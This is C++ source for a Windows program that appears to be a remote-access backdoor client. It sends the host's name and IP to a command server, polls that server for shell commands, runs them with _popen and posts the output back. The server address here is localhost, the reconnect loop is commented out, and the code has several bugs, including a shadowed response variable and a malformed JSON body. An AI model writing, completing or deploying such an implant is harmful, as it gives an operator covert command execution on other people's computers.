#include <cstdio>
#include <ctime>
#include <iostream>
#include <string>
#include <direct.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <SFML\Network.hpp>
#include "json.hpp"
#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;

int checkCD(std::string cmd) {
	if (cmd.find("cd") != std::string::npos) {
		int firstSpace = cmd.find(' ');
		if (firstSpace > 0) {
			std::string newDir = cmd.substr(firstSpace + 1);
			_chdir(newDir.c_str());
			return 1;
		}
		else {
			return 0;
		}
	}
	else {
		return 0;
	}
}

void cmdLoop() {
	sf::Http http;
	http.setHost("127.0.0.1", 5000);
	sf::Http::Request request;
	request.setMethod(sf::Http::Request::Post);
	request.setUri("/new");
	request.setField("Content-Type", "Content-Type: application/json; charset=utf-8");

	char* hostname = new char[1024];
	gethostname(hostname, 256);
	std::string host = hostname;

	std::string ip = sf::IpAddress::getLocalAddress().toString();
	json j;
	j["id"] = 1;
	j["hostname"] = hostname;
	j["ip"] = ip;
	j["status"] = 1001;
	j["time"] = time(0);
	request.setBody(j.dump());
	sf::Http::Response response = http.sendRequest(request);
	while (response.getStatus() != 1001) {
		j.erase(j.begin(), j.end());
		request.setBody("{'status': 1000, 'id': 1}");
		sf::Http::Response response = http.sendRequest(request);
		std::string input = response.getBody();
		if (input == "close") {
			return;
		}
		if (checkCD(input)) {
			continue;
		}
		else {
			char buffer[128];
			std::string s;
			FILE* result = _popen(input.c_str(), "r");
			while (fgets(buffer, sizeof(buffer), result)) {
				s += buffer;
			}
			_pclose(result);
			j["output"] = s;
			j["id"] = 1;
			j["status"] = 1002;
			request.setBody(j.dump());
			http.sendRequest(request);
		}
	}
}

void printMessage(const std::string &message) {
	printf("%s\n", message.c_str());
}

int main() {
	sf::Http http;
	http.setHost("127.0.0.1", 5000);
	sf::Http::Request request;
	request.setMethod(sf::Http::Request::Post);
	request.setUri("/poop");
	request.setField("Content-Type", "Content-Type: application/json; charset=utf-8");
	request.setBody("hsdffhi");
	sf::Http::Response response = http.sendRequest(request);
	//while(true){
	//	cmdLoop();
	//	printf("%s\n", "Connection to server closed");
	//	printf("%s\n", "Waiting 5 seconds...");
	//	Sleep(5000);
	//	printf("%s\n", "Trying again...");
	//}
}